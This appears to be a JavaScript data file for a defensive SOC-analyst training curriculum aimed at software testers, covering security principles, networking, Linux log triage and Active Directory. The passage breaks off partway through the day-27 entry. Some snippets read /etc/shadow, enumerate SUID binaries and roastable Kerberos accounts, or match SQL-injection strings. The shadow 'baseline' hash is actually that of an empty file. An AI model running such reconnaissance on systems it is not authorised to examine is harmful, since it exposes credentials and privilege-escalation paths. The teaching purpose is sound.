/**
 * Comprehensive 90-Day (12-Week) QA-to-SOC / Cyber Security Analyst Mastery Curriculum.
 * Specially designed for software testers transitioning to defensive security / SOC analyst roles.
 */

export const MONTHS_DATA = [
  {
    id: 'month-1',
    monthNumber: 1,
    title: 'Foundations of Cyber Defense',
    subtitle: 'Security Principles, Deep Networking, Linux CLI & Windows Internals',
    theme: 'cyan',
    icon: 'Shield',
    goal: 'Build an unshakeable understanding of computer networks, operating system internals, packet flows, and foundational security frameworks.',
    weeks: [1, 2, 3, 4],
    domains: ['Networking', 'Linux/CLI', 'Windows/AD', 'Security Principles']
  },
  {
    id: 'month-2',
    monthNumber: 2,
    title: 'SOC Operations & Technical Defense',
    subtitle: 'Threat Intel, SIEM (Splunk/ELK), Wireshark & Python for Security',
    theme: 'green',
    icon: 'Terminal',
    goal: 'Master day-to-day SOC Analyst Tier 1 workflows: log correlation, alert triage, network traffic inspection, and Python security automation.',
    weeks: [5, 6, 7, 8],
    domains: ['SIEM & Logs', 'Packet Analysis', 'Threat Intelligence', 'Python Scripting']
  },
  {
    id: 'month-3',
    monthNumber: 3,
    title: 'AppSec, Incident Triage & Job Readiness',
    subtitle: 'OWASP Top 10, Live Incident Playbooks, Home Labs & Interview Prep',
    theme: 'purple',
    icon: 'Crosshair',
    goal: 'Leverage QA testing background into AppSec/OWASP mastery, triage live enterprise incident scenarios, build home lab portfolio, and crack interviews.',
    weeks: [9, 10, 11, 12],
    domains: ['Web AppSec/OWASP', 'Incident Response', 'Home Labs', 'Interview Prep']
  }
];

export const CURRICULUM_DATA = [
  // ==========================================
  // MONTH 1: FOUNDATIONS
  // ==========================================
  // --- WEEK 1 ---
  {
    day: 1,
    week: 1,
    month: 1,
    title: 'The Core Security Principles & The CIA Triad',
    category: 'Security Principles',
    estimatedMinutes: 45,
    difficulty: 'Beginner',
    summary: 'Understand the foundational pillars of information security: Confidentiality, Integrity, Availability, and how they govern every defensive decision.',
    qaBridge: 'In QA, you test for functionality ("Does clicking Save persist data?"). In Security, you test the CIA properties of that data ("Can unauthorized users see it? Can anyone tamper with it in transit? Is the database available under a flood of requests?").',
    theory: `
### What is Information Security?
Information security is not about building impenetrable walls (which is impossible), but about managing risk and maintaining business operations despite adversarial threats. Every security tool, firewall rule, and SOC alert ultimately protects one or more vertices of the **CIA Triad**.

\`\`\`
          [ Confidentiality ]
                /     \\
               /       \\
              /   CIA   \\
             /   Triad   \\
            /             \\
[ Integrity ] ------------- [ Availability ]
\`\`\`

---

### The CIA Triad Breakdown

#### 1. Confidentiality (Privacy & Access Control)
* **Definition:** Ensuring that sensitive data is accessible ONLY to authorized individuals, processes, or devices.
* **Threats:** Data exfiltration, eavesdropping/sniffing, Insecure Direct Object References (IDOR), unauthorized database dumps.
* **Defensive Controls:** Strong encryption (AES-256 at rest, TLS 1.3 in transit), Role-Based Access Control (RBAC), Multi-Factor Authentication (MFA), least privilege.

#### 2. Integrity (Data Authenticity & Trustworthiness)
* **Definition:** Guaranteeing that information and systems are accurate, complete, and have NOT been altered, corrupted, or forged by unauthorized parties.
* **Threats:** Man-in-the-Middle (MitM) packet tampering, SQL injection data overwrites, unauthorized file modification, malicious code injection.
* **Defensive Controls:** Cryptographic hashes (SHA-256, SHA-3), Digital Signatures, File Integrity Monitoring (FIM such as Wazuh/Tripwire), database transaction logs.

#### 3. Availability (Uptime & Business Continuity)
* **Definition:** Ensuring that authorized users have reliable, timely access to data, systems, and services whenever needed.
* **Threats:** Distributed Denial of Service (DDoS) volumetric attacks, ransomware file encryption, hardware failures, DNS hijacking.
* **Defensive Controls:** High Availability (HA) clusters, redundant server load balancers, regular air-gapped backups, disaster recovery sites, DDoS scrubbing services (Cloudflare, Akamai).

---

### Extended Principles: AAA & Non-Repudiation
1. **Authentication (Who are you?):** Verifying identity (Passwords, Biometrics, OTP tokens).
2. **Authorization (What are you allowed to do?):** Checking permissions (Admin vs Standard User).
3. **Accounting/Auditing (What did you do and when?):** Logging every action with timestamps for forensic review.
4. **Non-Repudiation:** Ensuring a user cannot deny having performed an action (achieved via asymmetric digital signatures and immutable audit logs).
    `,
    codeSnippet: {
      language: 'bash',
      title: 'Verifying File Integrity with SHA-256 Hash',
      code: `# Calculate SHA-256 hash of a critical file (e.g., suspicious binary or system config)
sha256sum /etc/shadow

# Compare against known good baseline
echo "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  /etc/shadow" | sha256sum -c -
`
    },
    practicalExercise: 'Open your terminal or command prompt. Pick any text file, generate its SHA-256 hash, edit a single character in the file, and re-hash it. Observe the dramatic difference (the Avalanche Effect).',
    cheatSheet: [
      { key: 'Confidentiality', val: 'Encryption, Access Control, Data Classification' },
      { key: 'Integrity', val: 'Hashing (SHA-256), Digital Signatures, FIM' },
      { key: 'Availability', val: 'Redundancy, Backups, Load Balancing, DDoS Protection' },
      { key: 'AAA', val: 'Authentication + Authorization + Accounting' }
    ],
    quizId: 'quiz-day-1'
  },
  {
    day: 2,
    week: 1,
    month: 1,
    title: 'Threat Actors, Motivations & Attack Vectors',
    category: 'Security Principles',
    estimatedMinutes: 50,
    difficulty: 'Beginner',
    summary: 'Learn who the adversaries are, what drives their attacks (financial, political, espionage), and how they breach enterprise perimeter defenses.',
    qaBridge: 'In QA, you build user personas (e.g. "Admin user", "Guest user"). In Cyber Security, you build Adversary Personas ("Ransomware Gang", "Malicious Insider", "Nation-State APT") to anticipate how each persona will stress-test your system.',
    theory: `
### Understanding the Adversary Spectrum
To defend an enterprise network, a SOC Analyst must understand the adversary's capability, sophistication, and motivation.

| Threat Actor Type | Motivation | Sophistication | Examples / Target |
| :--- | :--- | :--- | :--- |
| **Cybercriminals (Organized Crime)** | Financial Profit | Moderate to High | Ransomware (LockBit, BlackCat), BEC (Business Email Compromise), Carding |
| **Advanced Persistent Threats (APTs)** | Geopolitical Espionage, Intellectual Property theft | Extremely High (Custom Zero-Days, Multi-Year campaigns) | Nation-states (APT28/Fancy Bear, APT29/Cozy Bear, Lazarus Group) |
| **Hacktivists** | Political, ideological, or social statements | Low to Moderate | Anonymous, DDoS attacks, defacement, public credential leaks |
| **Insider Threats** | Revenge, financial greed, negligence, coercion | High (already has valid internal access & credentials) | Disgruntled employees, contractor credential sharing, accidental data leaks |
| **Script Kiddies** | Notoriety, curiosity, thrills | Low (Uses pre-built tools without understanding underlying code) | Running automated SQLmap or LOIC without stealth |

---

### Anatomy of an Attack Vector
An **attack vector** is the path or means by which an attacker gains unauthorized access to a computer or network.

1. **Email / Phishing (Vector #1 in Enterprise Breaches):** Spear phishing with malicious Excel macros, OAuth application consent grants, or credential harvesting landing pages.
2. **Exposed Services & Unpatched Vulnerabilities:** Internet-facing RDP (Port 3389), vulnerable VPN gateways (Fortinet, Palo Alto), unpatched Log4j / Apache servers.
3. **Supply Chain Attacks:** Compromising a trusted third-party software vendor or npm/Python dependency (e.g., SolarWinds, XZ Utils backdoor).
4. **Stolen Credentials & Password Spraying:** Reusing credentials dumped from external data breaches against corporate Single Sign-On (SSO) portals.
    `,
    codeSnippet: {
      language: 'python',
      title: 'Python Threat Intel IP Reputation Query Simulator',
      code: `import urllib.request
import json

def check_ip_reputation(ip_address):
    # Threat Intelligence lookup simulation
    known_bad_ips = {
        "198.51.100.23": {"threat": "Known Cobalt Strike C2 Server", "confidence": 98},
        "203.0.113.88": {"threat": "Active SSH Brute Force Origin", "confidence": 85}
    }
    
    if ip_address in known_bad_ips:
        result = known_bad_ips[ip_address]
        print(f"[!] ALERT: IP {ip_address} is MALICIOUS!")
        print(f"    Threat Type: {result['threat']} (Confidence: {result['confidence']}%)")
    else:
        print(f"[*] IP {ip_address} has no active threat flags in local feed.")

check_ip_reputation("198.51.100.23")
`
    },
    practicalExercise: 'Visit AlienVault OTX (otx.alienvault.com) or VirusTotal. Search a public domain or IP address and review how threat intelligence indicators (IOCs) are aggregated and classified.',
    cheatSheet: [
      { key: 'APT', val: 'Advanced Persistent Threat - Nation-state, stealthy, long-term persistence' },
      { key: 'Ransomware', val: 'Encrypts victim data and demands cryptocurrency payment' },
      { key: 'Attack Surface', val: 'Total sum of all publicly reachable entry points' },
      { key: 'IOC', val: 'Indicator of Compromise (Hashes, malicious IPs, domains, registry keys)' }
    ],
    quizId: 'quiz-day-2'
  },
  {
    day: 3,
    week: 1,
    month: 1,
    title: 'Cryptography, Hashing & The SSL/TLS Handshake',
    category: 'Security Principles',
    estimatedMinutes: 55,
    difficulty: 'Intermediate',
    summary: 'Master Symmetric vs Asymmetric encryption, one-way hashing algorithms, digital certificates, and the step-by-step TLS 1.3 cryptographic handshake.',
    qaBridge: 'In QA, you send HTTPS requests in Postman or inspect padlock icons in DevTools. As a Security Analyst, you must understand how symmetric session keys are negotiated securely over an untrusted public network without eavesdroppers seeing them.',
    theory: `
### Cryptography Primer for Defenders

\`\`\`
Symmetric Encryption (Same Key):
Plaintext  +  [ Secret Key K ]  --->  Ciphertext  --->  [ Secret Key K ]  --->  Plaintext
(Fast, used for bulk data transmission: AES-128, AES-256, ChaCha20)

Asymmetric Encryption (Key Pair):
Plaintext  +  [ Public Key ]    --->  Ciphertext  --->  [ Private Key ]   --->  Plaintext
(Computationally heavy, used for key exchange & digital signatures: RSA-4096, ECC, Diffie-Hellman)
\`\`\`

---

### Hashing vs Encryption vs Encoding (Crucial Interview Topic!)
1. **Hashing (One-Way):** Mathematical one-way algorithm (SHA-256, bcrypt). You CANNOT "decrypt" a hash. Used for password storage and file integrity verification.
2. **Encryption (Two-Way with Key):** Reversible transformation using a secret key (AES-256). Designed to protect confidentiality.
3. **Encoding (Reversible WITHOUT Key):** Data formatting representation (Base64, URL encoding, Hex). **Encoding provides ZERO security**; anyone can decode it instantly.

---

### The TLS 1.3 Handshake (How HTTPS Works)
When a browser connects to \`https://securebank.com\`:
1. **Client Hello:** Client sends supported TLS versions, supported cipher suites, and a client random nonce.
2. **Server Hello & Certificate:** Server picks the cipher suite, sends its digital certificate (signed by a trusted Certificate Authority / CA), server public key, and server random.
3. **Key Exchange (Elliptic Curve Diffie-Hellman / ECDHE):** Both parties calculate the **Shared Symmetric Session Key** independently without ever sending the key over the wire!
4. **Encrypted Communication:** All subsequent HTTP traffic is encrypted using the blazing-fast AES symmetric session key.
    `,
    codeSnippet: {
      language: 'bash',
      title: 'Inspecting SSL/TLS Certificates with OpenSSL CLI',
      code: `# Connect to a server and view certificate details, issuer CA, and expiration
openssl s_client -connect google.com:443 -servername google.com

# Extract just the certificate expiration date
echo | openssl s_client -connect github.com:443 2>/dev/null | openssl x509 -noout -dates
`
    },
    practicalExercise: 'Open Chrome or Firefox DevTools -> Security Tab -> View Certificate. Inspect the Subject Alternative Names (SAN), Issuer CA (e.g. Let\'s Encrypt, DigiCert), and the Public Key algorithm.',
    cheatSheet: [
      { key: 'AES-256', val: 'Gold standard symmetric encryption for data at rest and in transit' },
      { key: 'RSA / ECC', val: 'Asymmetric encryption used for digital signatures & secure key exchange' },
      { key: 'SHA-256', val: '256-bit cryptographic one-way hashing algorithm' },
      { key: 'Base64', val: 'Encoding scheme (NOT encryption!) starting with strings like "eyJ..."' }
    ],
    quizId: 'quiz-day-3'
  },
  {
    day: 4,
    week: 1,
    month: 1,
    title: 'Defense in Depth & Least Privilege Architecture',
    category: 'Security Principles',
    estimatedMinutes: 40,
    difficulty: 'Beginner',
    summary: 'Explore layered defensive models: Perimeter, Network, Host, Application, and Data security layers, and zero-trust principles.',
    qaBridge: 'In QA, if one validation check fails, the app might crash. In Security Defense in Depth, if the perimeter firewall is bypassed, the endpoint EDR, network segmentation, and database encryption still prevent the attacker from achieving their goal.',
    theory: `
### The Castle Principle: Defense in Depth
Defense in Depth is a security strategy where multiple redundant defensive layers are implemented across an IT environment. If an attacker penetrates one layer, subsequent layers prevent total compromise.

\`\`\`
[ 1. Perimeter Layer ]   ---> Cloudflare DDoS, External Firewall, WAF
  [ 2. Network Layer ]    ---> VLAN Segmentation, IDS/IPS (Suricata/Snort), Zero Trust
    [ 3. Endpoint Layer ]  ---> EDR (CrowdStrike/Defender), Hardening, Patching
      [ 4. Application Layer ]-> Input Validation, Authentication, RBAC, WAF
        [ 5. Data Layer ]  ---> Database Encryption (AES), Data Loss Prevention (DLP)
\`\`\`

---

### Principle of Least Privilege (PoLP)
* Every user, program, and system process must operate using the **bare minimum privileges necessary** to complete its legitimate function.
* **Why it matters in SOC:** If an attacker compromises a web application running as \`root\` or \`SYSTEM\`, they immediately own the entire server. If the app runs under an unprivileged user (\`www-data\`), their lateral movement is severely restricted.

---

### Zero Trust Architecture (ZTA)
* **Core Motto:** *"Never Trust, Always Verify."*
* Traditional castle-and-moat models assumed anything inside the corporate LAN was safe. Zero Trust treats every request—even internal ones—as if it originates from an open, hostile network.
* Verifies identity, device health, location, and context before granting access to any individual resource.
    `,
    codeSnippet: {
      language: 'bash',
      title: 'Auditing Sudo Privileges & Root Execution',
      code: `# Check which commands current user can run with elevated privileges
sudo -l

# Find all SUID binaries on Linux (binaries running with root permissions)
find / -perm -u=s -type f 2>/dev/null
`
    },
    practicalExercise: 'Check your current operating system user account. Is your daily account a full Administrator / Root user? Review why standard user accounts reduce malware infection severity.',
    cheatSheet: [
      { key: 'Defense in Depth', val: 'Layered security so single point of failure does not cause breach' },
      { key: 'PoLP', val: 'Principle of Least Privilege - minimum rights needed for the job' },
      { key: 'Zero Trust', val: 'Verify explicitly, use least privileged access, assume breach' }
    ],
    quizId: 'quiz-day-4'
  },

  // --- WEEK 2: NETWORKING DEEP DIVE ---
  {
    day: 8,
    week: 2,
    month: 1,
    title: 'The OSI Model vs TCP/IP: A Defender\'s Perspective',
    category: 'Networking',
    estimatedMinutes: 60,
    difficulty: 'Intermediate',
    summary: 'Dissect the 7 Layers of the OSI model and 4 layers of TCP/IP. Learn how packets encapsulate and where specific cyber attacks and defensive controls live.',
    qaBridge: 'In QA, you deal mostly with Layer 7 (HTTP responses, JSON payloads). In SOC analysis, you must drill down to Layer 3 (IP spoofing, geo-blocking) and Layer 4 (TCP flags, SYN floods, port scans) to identify intrusions.',
    theory: `
### The 7 Layers of OSI & Where Attacks Strike

\`\`\`
Layer 7: Application   [HTTP, DNS, SSH, SMTP]   ---> SQLi, XSS, Phishing, Layer 7 DDoS
Layer 6: Presentation  [SSL/TLS, JPEG, ASCII]    ---> SSL Stripping, Malicious Payloads
Layer 5: Session       [RPC, NetBIOS, Sockets]   ---> Session Hijacking, Token Theft
Layer 4: Transport     [TCP, UDP, Ports]         ---> SYN Flood, Port Scans, Reset Attacks
Layer 3: Network       [IP, ICMP, Routing]       ---> IP Spoofing, Ping of Death, BGP Hijack
Layer 2: Data Link     [MAC, Ethernet, ARP]      ---> ARP Poisoning, MAC Flooding
Layer 1: Physical      [Cables, Fiber, Radio]    ---> Wiretapping, Rogue Wi-Fi APs
\`\`\`

---

### Packet Encapsulation: How Data Travels
When you send an HTTP request:
1. Application data (\`GET /login\`) is created (L7).
2. TCP header with Source Port (e.g. 52410) and Destination Port (443) is prepended (L4).
3. IP header with Source IP (\`192.168.1.50\`) and Destination IP (\`93.184.216.34\`) is added (L3).
4. Ethernet frame with Source MAC and Gateway Router Destination MAC is wrapped around it (L2).
5. Converted into electrical/optical bits on the wire (L1).
    `,
    codeSnippet: {
      language: 'bash',
      title: 'Inspecting Network Interfaces and Routing Table',
      code: `# View IP addresses and MAC addresses
ip addr show     # Linux
# or
ipconfig /all    # Windows

# View Active Routing Table and Default Gateway
ip route show    # Linux
# or
route print      # Windows
`
    },
    practicalExercise: 'Run `traceroute 8.8.8.8` (Linux) or `tracert 8.8.8.8` (Windows). Count how many Layer 3 router hops your packet traverses before reaching Google DNS.',
    cheatSheet: [
      { key: 'Layer 7 (Application)', val: 'HTTP, DNS, SSH, SMTP, FTP' },
      { key: 'Layer 4 (Transport)', val: 'TCP (Reliable, Handshake), UDP (Fast, Connectionless)' },
      { key: 'Layer 3 (Network)', val: 'IP Addresses, Routers, ICMP (Ping)' },
      { key: 'Layer 2 (Data Link)', val: 'MAC Addresses, Switches, ARP protocol' }
    ],
    quizId: 'quiz-day-8'
  },
  {
    day: 10,
    week: 2,
    month: 1,
    title: 'Crucial Ports, Protocols & TCP 3-Way Handshake',
    category: 'Networking',
    estimatedMinutes: 60,
    difficulty: 'Intermediate',
    summary: 'Master the top 20 ports every SOC analyst must know by heart, the mechanics of SYN/SYN-ACK/ACK, and TCP termination.',
    qaBridge: 'In QA, you connect to localhost:3000 or staging API port 8080. In SOC investigations, seeing outbound traffic on Port 445 (SMB) or Port 3389 (RDP) to an external IP indicates immediate lateral movement or ransomware spread.',
    theory: `
### The TCP 3-Way Handshake (Crucial SOC Concept)
Before any reliable data transmission occurs over TCP, a 3-way handshake is established:

\`\`\`
Client                                Server
  |              1. SYN [Seq=X]          |  Client wants to establish connection
  | -----------------------------------> |
  |         2. SYN-ACK [Seq=Y, Ack=X+1]  |  Server acknowledges & agrees
  | <----------------------------------- |
  |              3. ACK [Ack=Y+1]        |  Client acknowledges -> ESTABLISHED!
  | -----------------------------------> |
\`\`\`

* **Security Relevance:** 
  * In a **SYN Flood DDoS**, attacker sends millions of SYN packets and never sends the final ACK, exhausting the server's connection memory table (backlog queue).
  * In an **Nmap Stealth Scan (-sS)**, Nmap sends SYN, receives SYN-ACK, and immediately sends **RST (Reset)** to tear down the connection without logging a full application session.

---

### Top Ports Every Security Analyst MUST Memorize

| Port | Protocol | Usage / Vulnerability Risk |
| :--- | :--- | :--- |
| **20/21** | FTP | Cleartext file transfer; credential sniffing risk |
| **22** | SSH | Secure remote management; target of automated brute-force attacks |
| **23** | Telnet | Plaintext terminal (deprecated!); severe security liability |
| **25** | SMTP | Mail transfer; open relay abuse, phishing delivery |
| **53** | DNS | Domain resolution; DNS tunneling, amplification DDoS, poisoning |
| **80** | HTTP | Plaintext web traffic |
| **88** | Kerberos | Active Directory authentication; Golden/Silver ticket attacks |
| **135/139** | RPC/NetBIOS | Windows inter-process communication; legacy exploit vector |
| **389/636** | LDAP/LDAPS | Directory service querying |
| **443** | HTTPS | Encrypted TLS web traffic; C2 beaconing hides inside 443 |
| **445** | SMB | Windows file sharing; EternalBlue (WannaCry ransomware exploit) |
| **3389** | RDP | Remote Desktop Protocol; #1 target for brute force & ransomware entry |
    `,
    codeSnippet: {
      language: 'bash',
      title: 'Viewing Active TCP Listening Ports and Established Connections',
      code: `# Linux: View all listening TCP ports and associated process IDs
ss -tulpen
# or
netstat -tulpn

# Windows: View all active connections with process PID
netstat -ano | findstr ESTABLISHED
`
    },
    practicalExercise: 'Use our built-in Wireshark / Port Inspector tool to filter by port 445 and observe how SMB packets structure file sharing sessions.',
    cheatSheet: [
      { key: 'Port 22', val: 'SSH (Encrypted Remote CLI)' },
      { key: 'Port 53', val: 'DNS (Domain Name System)' },
      { key: 'Port 88', val: 'Kerberos (AD Authentication)' },
      { key: 'Port 445', val: 'SMB (Windows File Sharing / WannaCry vector)' },
      { key: 'Port 3389', val: 'RDP (Remote Desktop Protocol)' }
    ],
    quizId: 'quiz-day-10'
  },
  {
    day: 12,
    week: 2,
    month: 1,
    title: 'Subnetting, CIDR, Firewalls & Network Defense',
    category: 'Networking',
    estimatedMinutes: 50,
    difficulty: 'Intermediate',
    summary: 'Demystify CIDR calculations (/24, /16), Private RFC 1918 IP ranges, NAT, and Stateful vs Stateless Firewalls.',
    qaBridge: 'In QA, you test in environments like 10.0.0.x or 192.168.x.x. In a SOC, recognizing whether an IP is internal (Private RFC 1918) vs external public routable determines if you are investigating internal lateral movement or external data exfiltration.',
    theory: `
### RFC 1918: Private (Non-Routable) IP Address Ranges
These ranges are reserved for internal networks and NEVER route across the public internet:
1. **Class A:** \`10.0.0.0\` to \`10.255.255.255\` (\`10.0.0.0/8\` - 16.7 million IPs)
2. **Class B:** \`172.16.0.0\` to \`172.31.255.255\` (\`172.16.0.0/12\` - 1 million IPs)
3. **Class C:** \`192.168.0.0\` to \`192.168.255.255\` (\`192.168.0.0/16\` - 65,536 IPs)
4. **Loopback:** \`127.0.0.1\` to \`127.255.255.255\` (Local machine localhost)

---

### CIDR Notation Quick Cheat
* \`/32\`: Exactly 1 specific IP host (\`192.168.1.15/32\`)
* \`/24\`: 256 IPs (254 usable hosts: \`192.168.1.0/24\` -> \`.1\` to \`.254\`)
* \`/16\`: 65,536 IPs (\`172.16.0.0/16\`)
* \`/8\`: 16,777,216 IPs (\`10.0.0.0/8\`)

---

### Stateful vs Stateless Firewalls
* **Stateless (Packet Filter / ACL):** Inspects packets in isolation based solely on static rules (e.g., Allow port 80). Has no memory of past packets.
* **Stateful Firewall:** Tracks the *state* of active connections in a state table. If an internal user initiates an outbound connection on port 443, the firewall automatically permits the return response traffic without opening inbound port 443 to the world!
* **Next-Gen Firewall (NGFW):** Inspects application-layer data (Layer 7), detects malware signatures, and inspects decrypted TLS streams.
    `,
    codeSnippet: {
      language: 'bash',
      title: 'Configuring UFW (Uncomplicated Firewall) on Linux',
      code: `# Default deny all incoming, allow all outgoing
sudo ufw default deny incoming
sudo ufw default allow outgoing

# Allow SSH only from management subnet
sudo ufw allow proto tcp from 10.10.5.0/24 to any port 22

# Enable and check firewall status
sudo ufw enable
sudo ufw status verbose
`
    },
    practicalExercise: 'Calculate how many usable host IP addresses are available in the subnet `10.20.30.0/26`. (Hint: 2^(32-26) - 2 = 62 hosts).',
    cheatSheet: [
      { key: '10.0.0.0/8', val: 'Private RFC 1918 Class A' },
      { key: '172.16.0.0/12', val: 'Private RFC 1918 Class B' },
      { key: '192.168.0.0/16', val: 'Private RFC 1918 Class C' },
      { key: 'Stateful Firewall', val: 'Maintains connection state table; permits expected return packets' }
    ],
    quizId: 'quiz-day-12'
  },

  // --- WEEK 3: LINUX CLI & LOG INVESTIGATION ---
  {
    day: 15,
    week: 3,
    month: 1,
    title: 'Linux Filesystem Hierarchy & Critical Security Files',
    category: 'Linux/CLI',
    estimatedMinutes: 50,
    difficulty: 'Intermediate',
    summary: 'Tour the Linux root filesystem from a security perspective: /etc, /var/log, /proc, /tmp, and why adversaries love hiding in /tmp and /dev/shm.',
    qaBridge: 'In QA, you might check app logs in `/var/log/app.log`. In Incident Response, `/var/log/auth.log` and `/var/log/syslog` contain the exact forensic breadcrumbs of attacker SSH logins, privilege escalations, and persistence mechanisms.',
    theory: `
### The Linux Directory Structure for Threat Hunters

\`\`\`
/ (Root)
 ├── /etc/            ---> System configuration files (Passwords, Cron jobs, Network)
 │    ├── /etc/passwd ---> List of all user accounts & default shell
 │    ├── /etc/shadow ---> Encrypted password hashes (Accessible ONLY by root)
 │    ├── /etc/sudoers---> Configuration of who can run sudo commands
 │    └── /etc/crontab---> Scheduled tasks (Common attacker persistence spot!)
 ├── /var/log/        ---> Enterprise log treasure trove!
 │    ├── auth.log    ---> SSH logins, sudo attempts, auth failures (Ubuntu/Debian)
 │    ├── secure      ---> Authentication logs on RHEL/CentOS
 │    └── syslog      ---> General system daemon activity
 ├── /tmp/ & /dev/shm ---> World-writable directories (Malware staging grounds!)
 └── /proc/           ---> Live virtual filesystem showing running processes in RAM
\`\`\`

---

### Why Attackers Abuse \`/tmp\` and \`/dev/shm\`
1. **World-Writable Permissions (777):** Any compromised service user (\`www-data\`, \`nobody\`) can download and execute malicious scripts or cryptominers here.
2. **\`/dev/shm\` is Shared RAM:** Files stored here exist in memory, leaving less disk artifact footprint.
3. **Hardening Fix:** Mount \`/tmp\` with \`noexec,nosuid,nodev\` flags in \`/etc/fstab\` to prevent executable execution!
    `,
    codeSnippet: {
      language: 'bash',
      title: 'Hunting Suspicious Files in /tmp and Checking Users',
      code: `# Find all executables created in /tmp within the last 2 days
find /tmp /var/tmp /dev/shm -type f -perm /111 -mtime -2 -ls

# View users with login shell privileges (not nologin/false)
grep -v "nologin\\|false" /etc/passwd
`
    },
    practicalExercise: 'Use the command `cat /etc/passwd | cut -d: -f1,3,7` to list all usernames, their UIDs, and their default shells.',
    cheatSheet: [
      { key: '/etc/passwd', val: 'World-readable list of user accounts & shells' },
      { key: '/etc/shadow', val: 'Root-only readable cryptographic password hashes' },
      { key: '/var/log/auth.log', val: 'Authentication & SSH logon log file' },
      { key: '/tmp & /dev/shm', val: 'World-writable directories used for staging malware' }
    ],
    quizId: 'quiz-day-15'
  },
  {
    day: 19,
    week: 3,
    month: 1,
    title: 'Bash Command-Line Mastery for Log Triage',
    category: 'Linux/CLI',
    estimatedMinutes: 65,
    difficulty: 'Intermediate',
    summary: 'Master the core command-line toolchain: grep, awk, sed, cut, sort, uniq -c to parse 100,000 log lines in seconds and extract attacker IPs.',
    qaBridge: 'Automating log searches in Bash is just like writing automated test assertions—instead of manually scanning logs, you write a one-liner to filter out noise and extract anomalies.',
    theory: `
### The Power of the Unix Pipe Pipeline \`|\`
As a SOC Analyst, you will frequently be given a raw 500MB web server log or SSH authentication log and asked: *"Which IP attacked us, and how many attempts did they make?"*

The 5 Essential Command-Line Knives:
1. \`grep\`: Search lines matching regular expressions.
2. \`cut\` / \`awk\`: Extract specific columns/fields (e.g. IP column, HTTP status code column).
3. \`sort\`: Sort values alphabetically or numerically (\`sort -n\`).
4. \`uniq -c\`: Count duplicate consecutive occurrences.
5. \`head\` / \`tail\`: Display top N or bottom N lines.

---

### Real-World SOC Log Analysis Pipeline
\`\`\`bash
# Finding the Top 10 IP addresses failing SSH logins in auth.log:
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr | head -n 10
\`\`\`

Explanation step by step:
1. \`grep "Failed password"\` -> Filters only failed SSH authentication attempts.
2. \`awk '{print $(NF-3)}'\` -> Extracts the IP address (4th field from end of line).
3. \`sort\` -> Sorts identical IPs together so \`uniq\` can group them.
4. \`uniq -c\` -> Groups identical IPs and prepends the count of attempts.
5. \`sort -nr\` -> Sorts numerically in reverse order (highest attack count at the top).
6. \`head -n 10\` -> Shows the top 10 worst offending IP addresses.
    `,
    codeSnippet: {
      language: 'bash',
      title: 'Top SOC Analyst Bash One-Liners',
      code: `# 1. Count HTTP Status codes in Apache access log:
cat access.log | awk '{print $9}' | sort | uniq -c | sort -nr

# 2. Extract all unique external IP addresses from an auth log:
grep -E -o "([0-9]{1,3}[\\.]){3}[0-9]{1,3}" auth.log | sort -u

# 3. Find requests containing SQL Injection signatures (' or union or select):
grep -i -E "(union.*select|select.*from|'--|%27)" access.log
`
    },
    practicalExercise: 'Try the interactive Bash Log Hunter in our Scripting Sandbox to find the malicious IP in a live auth.log sample.',
    cheatSheet: [
      { key: 'grep -i "pattern"', val: 'Case-insensitive pattern search' },
      { key: 'awk \'{print $1}\'', val: 'Extract column 1' },
      { key: 'sort | uniq -c | sort -nr', val: 'Frequency count and rank from highest to lowest' },
      { key: 'grep -E -o "[0-9.]+"', val: 'Extract exact regex matches only' }
    ],
    quizId: 'quiz-day-19'
  },

  // --- WEEK 4: WINDOWS & ACTIVE DIRECTORY ---
  {
    day: 25,
    week: 4,
    month: 1,
    title: 'Active Directory Architecture, Kerberos & NTLM',
    category: 'Windows/AD',
    estimatedMinutes: 60,
    difficulty: 'Intermediate',
    summary: 'Understand Active Directory Domain Services (AD DS), Domain Controllers, Kerberos Ticket Granting (TGT/TGS), and common AD attack vectors.',
    qaBridge: 'In QA, you test user roles and permissions on a single web app. In enterprise IT, Active Directory is the centralized identity brain that controls access to 10,000+ employee laptops, servers, email, and files.',
    theory: `
### What is Active Directory?
Active Directory (AD) is Microsoft's directory service used by 90%+ of Fortune 500 enterprises to centrally manage users, computers, security policies (GPO), and access controls across a domain.

\`\`\`
                       [ Domain Controller (DC) ]
                     /            |             \\
                    /             |              \\
          [ User Workstations ]  [ File Shares ]  [ Database Servers ]
\`\`\`

---

### Kerberos Authentication Flow (Tickets, Not Passwords!)
When a user logs in, their plaintext password is NEVER sent over the network:
1. **AS-REQ (Authentication Service Request):** User sends timestamp encrypted with their password hash to the Key Distribution Center (KDC) on the Domain Controller.
2. **AS-REP (Ticket Granting Ticket / TGT):** KDC validates user and issues a **TGT** (encrypted with the secret \`krbtgt\` key).
3. **TGS-REQ (Ticket Granting Service Request):** User presents their TGT to request access to a specific service (e.g., SharePoint server \`sp-srv01\`).
4. **TGS-REP (Service Ticket):** KDC issues a Service Ticket encrypted with the service account's password hash.
5. **AP-REQ (Application Request):** User presents Service Ticket to the SharePoint server to gain access.

---

### Famous Active Directory Attacks
* **Pass-the-Hash (PtH):** Attacker steals NTLM hash from LSASS memory on one compromised machine and authenticates to other servers without cracking the plaintext password.
* **Kerberoasting:** Attacker requests Service Tickets for accounts with SPNs (Service Principal Names) and cracks the ticket offline with Hashcat to reveal weak service passwords.
* **Golden Ticket:** If the attacker dumps the \`krbtgt\` hash, they can forge their own valid TGTs with Domain Admin privileges that never expire!
    `,
    codeSnippet: {
      language: 'powershell',
      title: 'Querying Active Directory with PowerShell',
      code: `# List all Domain Admins in the current domain
Get-ADGroupMember -Identity "Domain Admins" | Select-Object Name, SamAccountName

# Find user accounts configured with Kerberos pre-authentication disabled (AS-REP Roasting targets)
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth

# Check password expiration policy
Get-ADDefaultDomainPasswordPolicy
`
    },
    practicalExercise: 'Review our Active Directory flashcard deck. Memorize the roles of KDC, TGT, TGS, and the krbtgt account.',
    cheatSheet: [
      { key: 'Domain Controller (DC)', val: 'Server hosting Active Directory database (NTDS.dit)' },
      { key: 'KDC', val: 'Key Distribution Center - issues Kerberos tickets' },
      { key: 'TGT', val: 'Ticket Granting Ticket - proof of initial authentication' },
      { key: 'Kerberoasting', val: 'Cracking offline Kerberos service tickets to obtain service passwords' }
    ],
    quizId: 'quiz-day-25'
  },
  {
    day: 27,
    week: 4,
    month: 1,
